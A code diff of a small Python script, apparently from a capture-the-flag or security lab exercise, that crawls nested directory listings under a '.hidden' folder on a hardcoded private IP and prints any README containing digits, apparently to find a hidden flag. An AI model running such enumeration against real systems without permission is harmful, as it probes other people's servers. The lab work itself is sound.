@@ -1,30 +1,26 @@
-import urllib.request
+import requests
 
 # get all the directories
 def get_paths(ip):
     tab=[]
-    fp = urllib.request.urlopen(ip)
-    mystr = fp.read().decode("utf8")
-    fp.close()
-    mystr = mystr.split('\n')
-    for i in mystr:
+    fp = requests.get(ip).text
+    fp = fp.split("\n")
+    for i in fp:
         if len(i)>2 and i[0] == '<' and i[1] == 'a':
             tab+=[i[i.find('\"')+1:i.find('/')+1]]
     tab.pop()
     return tab
 
 
-ip = input('Enter the ip address to the .hidden folder: ')
+ip = "http://10.12.176.69/.hidden/"
 tab1=get_paths(ip)
 tab2=get_paths(ip+tab1[0])
 tab3=get_paths(ip+tab1[0]+tab2[0])
-
+print("starting...")
 for i in tab1:
     for j in tab2:
         for k in tab3:
-            fp = urllib.request.urlopen(ip+i+j+k+'README')
-            mystr = fp.read().decode("utf8")
-            fp.close()
+            mystr = requests.get(ip+i+j+k+'README').text
             for b in mystr:
                 if b.isdigit():
                     print(mystr)
